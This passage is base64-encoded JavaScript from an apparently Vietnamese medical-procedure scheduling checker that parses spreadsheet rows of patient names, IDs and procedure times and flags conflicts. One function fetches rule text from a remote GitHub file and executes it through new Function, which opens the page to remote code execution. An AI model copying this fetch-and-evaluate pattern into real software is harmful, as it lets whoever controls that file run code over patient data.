daSBnaWFuIGvhur90IHRow7pjIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG9wZXJhdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCBjaMOtbmgiKSk7DQogICAgICAgICAgICAgICAgY29uc3QgbmFtZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkjhu40gdMOqbiIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBwYXRpZW50SWRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJNw6MgQk4iKSk7DQoJCQkJY29uc3QgcGF0aWVudGFnZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlR14buVaSIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBkb2N0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaCIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBtaXNzaW5nQ29sdW1ucyA9IFtdOw0KICAgICAgICAgICAgICAgIGlmIChwcm9jZWR1cmVJbmRleCA9PT0gLTEpIG1pc3NpbmdDb2x1bW5zLnB1c2goJ1Ro4bunIHRodeG6rXQnKTsNCiAgICAgICAgICAgICAgICBpZiAoc3RhcnRJbmRleCA9PT0gLTEpIG1pc3NpbmdDb2x1bW5zLnB1c2goJ1Ro4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duJyk7DQogICAgICAgICAgICAgICAgaWYgKGVuZEluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu51pIGdpYW4ga+G6v3QgdGjDumMnKTsNCiAgICAgICAgICAgICAgICBpZiAob3BlcmF0b3JJbmRleCA9PT0gLTEpIG1pc3NpbmdDb2x1bW5zLnB1c2goJ1Ro4bunIHRodeG6rXQgY2jDrW5oJyk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKG1pc3NpbmdDb2x1bW5zLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKGBLaMO0bmcgdMOsbSB0aOG6pXkgY8OhYyBj4buZdCBi4bqvdCBideG7mWM6ICR7bWlzc2luZ0NvbHVtbnMuam9pbignLCAnKX1gKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgY29uc3Qgcm93cyA9IGRhdGEuc2xpY2UoOSk7DQogICAgICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlcyA9IFtdOw0KICAgICAgICAgICAgICAgIGNvbnN0IGhlcmJQcm9jZWR1cmVzID0gW107DQogICAgICAgICAgICAgICAgbGV0IHNraXBwZWRSb3dzID0gMDsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByb3dzLmZvckVhY2goKHJvdywgaW5kZXgpID0+IHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgcm93TnVtYmVyID0gaW5kZXggKyAxMDsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXJvdyB8fCByb3cubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoJ0TDsm5nIHRy4buRbmcnLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNraXBwZWRSb3dzKys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVOYW1lID0gcm93W3Byb2NlZHVyZUluZGV4XTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFwcm9jZWR1cmVOYW1lKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKGBUaOG7pyB0aHXhuq10IGtow7RuZyBu4bqxbSB0cm9uZyBkYW5oIHPDoWNoIGtp4buDbSB0cmE6ICR7cHJvY2VkdXJlTmFtZX1gLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNraXBwZWRSb3dzKys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXS5za2lwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBlbmQgPSBwYXJzZURhdGVUaW1lKHJvd1tlbmRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVyYlByb2NlZHVyZXMucHVzaCh7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvd0luZGV4OiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQkJCQlwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3Rvcjogcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGU6IHN0YXJ0Py5kYXRlS2V5IHx8ICdLaMO0bmcgeMOhYyDEkeG7i25oJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnQ6IHN0YXJ0Py5zZWNvbmRzIHx8IDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZDogZW5kPy5zZWNvbmRzIHx8IDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlTdGFydDogc3RhcnQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlFbmQ6IGVuZD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZUluZm86IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBlbmQgPSBwYXJzZURhdGVUaW1lKHJvd1tlbmRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghc3RhcnQgfHwgIWVuZCkgew0KICAgDQogICAgc2tpcHBlZFJvd3MrKzsNCiAgICByZXR1cm47DQp9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdGFydC5kYXRlS2V5ICE9PSBlbmQuZGF0ZUtleSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKCdUaOG7pyB0aHXhuq10IGLhuq90IMSR4bqndSB2w6Aga+G6v3QgdGjDumMga2jDoWMgbmfDoHknLCByb3dOdW1iZXIsIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnREYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmREYXRlOiBlbmQuZGF0ZUtleSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCQkJCXBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCQkJCXBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNraXBwZWRSb3dzKys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZW5kLnNlY29uZHMgPD0gc3RhcnQuc2Vjb25kcykgew0KICAgIGxvZ0Vycm9yKCdUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YyBwaOG6o2kgc2F1IHRo4budaSBnaWFuIGLhuq90IMSR4bqndScsIHJvd051bWJlciwgew0KICAgICAgICBzdGFydFRpbWU6IHN0YXJ0LmRpc3BsYXlUaW1lLA0KICAgICAgICBlbmRUaW1lOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgIHN0YXJ0VmFsdWU6IHJvd1tzdGFydEluZGV4XSwNCiAgICAgICAgZW5kVmFsdWU6IHJvd1tlbmRJbmRleF0sDQogICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQlwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQlwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQogICAgICAgIG5nYXlUaHVjSGllbjogZGF0ZUluZGV4ICE9PSAtMSA/IHJvd1tkYXRlSW5kZXhdIDogJ0tow7RuZyB4w6FjIMSR4buLbmgnDQogICAgfSk7DQogICAgc2tpcHBlZFJvd3MrKzsNCiAgICByZXR1cm47DQp9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGV4cGVjdGVkRHVyYXRpb24gPSBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdPy5kdXJhdGlvbiB8fCAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgYWN0dWFsRHVyYXRpb25NaW51dGVzID0gKGVuZC5zZWNvbmRzIC0gc3RhcnQuc2Vjb25kcykgLyA2MDsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KbGV0IGR1cmF0aW9uRGlmZiA9IE1hdGguYWJzKGFjdHVhbER1cmF0aW9uTWludXRlcyAtIGV4cGVjdGVkRHVyYXRpb24pOw0KbGV0IGlzRG9jdG9yID0gKHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSB8fCAnJykudG9Mb3dlckNhc2UoKSA9PT0gJ2RvY3Rvcic7DQppZiAoDQogICAgZXhwZWN0ZWREdXJhdGlvbiA+IDAgJiYNCiAgICAoDQogICAgICAgIChpc0RvY3RvciAmJiBkdXJhdGlvbkRpZmYgPj0gMSkgfHwgICAvLyDinJQgdMOgaSBraG/huqNuIGRvY3Rvcg0KICAgICAgICAoIWlzRG9jdG9yICYmIGR1cmF0aW9uRGlmZiA+IDEpICAgICAgLy8g4pyUIHTDoGkga2hv4bqjbiBraMOhYw0KICAgICkNCikgew0KICAgIGxvZ0Vycm9yKGBgLCByb3dOdW1iZXIsIHsNCiAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICBleHBlY3RlZDogZXhwZWN0ZWREdXJhdGlvbiwNCiAgICAgICAgYWN0dWFsOiBhY3R1YWxEdXJhdGlvbk1pbnV0ZXMsDQogICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQlwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQlwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICBvcGVyYXRvcjogcm93W29wZXJhdG9ySW5kZXhdID8gcm93W29wZXJhdG9ySW5kZXhdLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICBkYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICBuZ2F5VGh1Y0hpZW46IGRhdGVJbmRleCAhPT0gLTEgPyByb3dbZGF0ZUluZGV4XSA6ICdLaMO0bmcgeMOhYyDEkeG7i25oJywNCiAgICAgICAgc3RhcnRUaW1lOiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgZW5kVGltZTogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICBkb2N0b3I6IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIC8vIFRow6ptIGTDsm5nIG7DoHkNCiAgICB9KTsNCn0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocHJvY2VkdXJlTmFtZSA9PT0gJ1Phuq9jIHRodeG7kWMgdGhhbmcnKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVyYlByb2NlZHVyZXMucHVzaChwcm9jZWR1cmVzW3Byb2NlZHVyZXMubGVuZ3RoIC0gMV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dJbmRleDogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCQkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQoJCQkJCQkJZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0OiBzdGFydC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZDogZW5kLnNlY29uZHMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5RW5kOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uZmxpY3Q6IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0UmVhc29uOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVJbmZvOiBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1Z2dlc3Rpb246ICcnDQogICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKGBM4buXaSB44butIGzDvSBkw7JuZzogJHtlcnJvci5tZXNzYWdlfWAsIHJvd051bWJlciwgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcm93W3Byb2NlZHVyZUluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3JEZXRhaWxzOiBlcnJvci5zdGFjaw0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignS2jDtG5nIGPDsyB0aOG7pyB0aHXhuq10IG7DoG8gaOG7o3AgbOG7hyDEkeG7gyBraeG7g20gdHJhLiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBk4buvIGxp4buHdS4nKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgY2hlY2tDb25mbGljdHMocHJvY2VkdXJlcyk7DQogICAgICAgICAgICAgICAgZ2VuZXJhdGVUaW1lU3VnZ2VzdGlvbnMocHJvY2VkdXJlcyk7DQoJCQkJIC8vID09PSBUSMOKTSAzIETDkk5HIENoZWNrIG3DoyBtw6F5ID09PQ0KICAgICAgICBjaGVja01hY2hpbmVFcnJvcnMocHJvY2VkdXJlcywgZGF0YSk7DQogICAgICAgIGNoZWNrTWFjaGluZUNvbmZsaWN0cyhwcm9jZWR1cmVzLCBkYXRhKTsNCgkJY2hlY2tNaXNzaW5nTWFjaGluZUNvZGVzKHByb2NlZHVyZXMsIGRhdGEpOyANCgkJY2hlY2tEYXRlTWlzbWF0Y2gocHJvY2VkdXJlcywgZGF0YSk7DQogICAgICAgIC8vID09PSBL4bq+VCBUSMOaQyBUSMOKTSA9PT0NCiAgICAgICAgICAgICAgICBkaXNwbGF5UmVzdWx0cyhwcm9jZWR1cmVzLCBza2lwcGVkUm93cyk7DQogICAgICAgICAgICAgICAgd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzID0gaGVyYlByb2NlZHVyZXM7DQoJCQkJLy8gLS0tIEPhuq1wIG5o4bqtdCBz4buRIGNhIGtow6FjIMSRYSBz4buRIHRyw6puIG7DunQgLS0tDQpzZXRUaW1lb3V0KCgpID0+IHsNCiAgaWYgKHR5cGVvZiB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCA9PT0gJ2Z1bmN0aW9uJykgew0KICAgIHVwZGF0ZUhlcmJCdXR0b25XaXRoT3V0bGllckNvdW50KCk7DQogIH0NCn0sIDEwMCk7DQoNCiAgICAgICAgICAgICAgICBkaXNwbGF5RXJyb3JzKCk7DQoJCQkJIA0KICAgICAgICAvLyA9PT0gVEjDik0gMyBEw5JORyBjaGVjayBtw6MgbcOheSA9PT0NCiAgICAgICAgZGlzcGxheU1hY2hpbmVFcnJvcnMoKTsNCiAgICAgICAgZGlzcGxheU1hY2hpbmVDb25mbGljdHMoKTsNCgkJZGlzcGxheU1pc3NpbmdNYWNoaW5lRXJyb3JzKCk7DQoJCWRpc3BsYXlEYXRlTWlzbWF0Y2hFcnJvcnMoKTsNCiAgICAgICAgLy8gPT09IEvhur5UIFRIw5pDIFRIw4pNID09PQ0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICBsb2dFcnJvcihlcnJvci5tZXNzYWdlLCBudWxsLCBlcnJvci5zdGFjayk7DQogICAgICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgICAgIGFsZXJ0KCdDw7MgbOG7l2kgeOG6o3kgcmEga2hpIHjhu60gbMO9IGThu68gbGnhu4d1OiAnICsgZXJyb3IubWVzc2FnZSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KDQpsZXQgY29uZmxpY3RSdWxlc1RleHQgPSAnJzsNCg0KYXN5bmMgZnVuY3Rpb24gbG9hZENvbmZsaWN0UnVsZXMoKSB7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9jaGF1X3hsdGh1dGh1YXQudHh0P3RzPScgKyBEYXRlLm5vdygpOw0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCh1cmwpOw0KICAgICAgICBpZiAoIXJlcy5vaykgdGhyb3cgbmV3IEVycm9yKCdLaMO0bmcgdOG6o2kgxJHGsOG7o2MgY2hhdV94bHRodXRodWF0LnR4dCcpOw0KICAgICAgICBjb25mbGljdFJ1bGVzVGV4dCA9IChhd2FpdCByZXMudGV4dCgpKS50cmltKCk7DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgICBjb25zb2xlLmVycm9yKCdM4buXaSB04bqjaSBjaGF1X3hsdGh1dGh1YXQudHh0OicsIGUpOw0KICAgICAgICBjb25mbGljdFJ1bGVzVGV4dCA9ICcnOyAvLyBmYWxsYmFjazogcuG7l25nIC0+IGNvaSBuaMawIGtow7RuZyBjw7Mgbmdv4bqhaSBs4buHDQogICAgfQ0KfQ0KDQoNCg0KDQogICAgICAgIGZ1bmN0aW9uIGNoZWNrQ29uZmxpY3RzKHByb2NlZHVyZXMpIHsNCiAgICAgICAgICAgIGNvbnN0IGlnbm9yZUFkamFjZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lnbm9yZUFkamFjZW50Q2hlY2tib3gnKS5jaGVja2VkOw0KICAgICAgICAgICAgY29uc3QgZ3JvdXBzID0ge307DQogICAgICAgICAgICANCiAgICAgICAgICAgIHByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgICAgICBjb25zdCBrZXkgPSBgJHtwcm9jLm9wZXJhdG9yfV8ke3Byb2MuZGF0ZX1gOw0KICAgICAgICAgICAgICAgIGlmICghZ3JvdXBzW2tleV0pIHsNCiAgICAgICAgICAgICAgICAgICAgZ3JvdXBzW2tleV0gPSBbXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZ3JvdXBzW2tleV0ucHVzaChwcm9jKTsNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBPYmplY3QudmFsdWVzKGdyb3VwcykuZm9yRWFjaChncm91cCA9PiB7DQogICAgICAgICAgICAgICAgZ3JvdXAuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAxOyBpIDwgZ3JvdXAubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJldiA9IGdyb3VwW2kgLSAxXTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgY3VycmVudCA9IGdyb3VwW2ldOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBwcmV2RW5kV2l0aEJ1ZmZlciA9IHByZXYuZW5kICsgKHByZXYucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjA7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBpc0FkamFjZW50ID0gaWdub3JlQWRqYWNlbnQgJiYgY3VycmVudC5zdGFydCA9PT0gcHJldi5lbmQ7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoY3VycmVudC5zdGFydCA8IHByZXZFbmRXaXRoQnVmZmVyICYmICFpc0FkamFjZW50KSB7DQogICAgICAgICAgICAgICAgIA0KDQpsZXQgaXNDb25mbGljdCA9IHRydWU7DQogICAgdHJ5IHsNCiAgICAgICAgaWYgKGNvbmZsaWN0UnVsZXNUZXh0ICYmIGNvbmZsaWN0UnVsZXNUZXh0LnRyaW0oKSkgew0KICAgICAgICAgICAgY29uc3QgY29uZmxpY3RDb25kaXRpb24gPSBuZXcgRnVuY3Rpb24oJ3ByZXYnLCdjdXJyZW50JywncmV0dXJuICcgKyBjb25mbGljdFJ1bGVzVGV4dC50cmltKCkpOw0KICAgICAgICAgICAgLy8gY29uZmxpY3RDb25kaXRpb24oKSBUUuG6oiBW4buAIHRydWUgbuG6v3UgKsSRxrDhu6NjIG1p4buFbiB4dW5nIMSR4buZdCoNCiAgICAgICAgICAgIGNvbnN0IGFsbG93ZWQgPSBjb25mbGljdENvbmRpdGlvbihwcmV2LCBjdXJyZW50KTsNCiAgICAgICAgICAgIGlzQ29uZmxpY3QgPSAhYWxsb3dlZDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlzQ29uZmxpY3QgPSB0cnVlOyAvLyBraMO0bmcgY8OzIHJ1bGUgLT4gY+G7qSBiw6FvIHh1bmcgxJHhu5l0DQogICAgICAgIH0NCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2kga2hpIMSRw6FuaCBnacOhIHh1bmcgxJHhu5l0IHRo4budaSBnaWFuOicsIGVycik7DQogICAgICAgIGlzQ29uZmxpY3QgPSB0cnVlOw0KICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzQ29uZmxpY3QpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50LmNvbmZsaWN0ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50LmNvbmZsaWN0UmVhc29uID0gYCR7cHJldi5wcm9jZWR1cmV9PGJyPuKAoiBC4buHbmggbmjDom46ICR7cH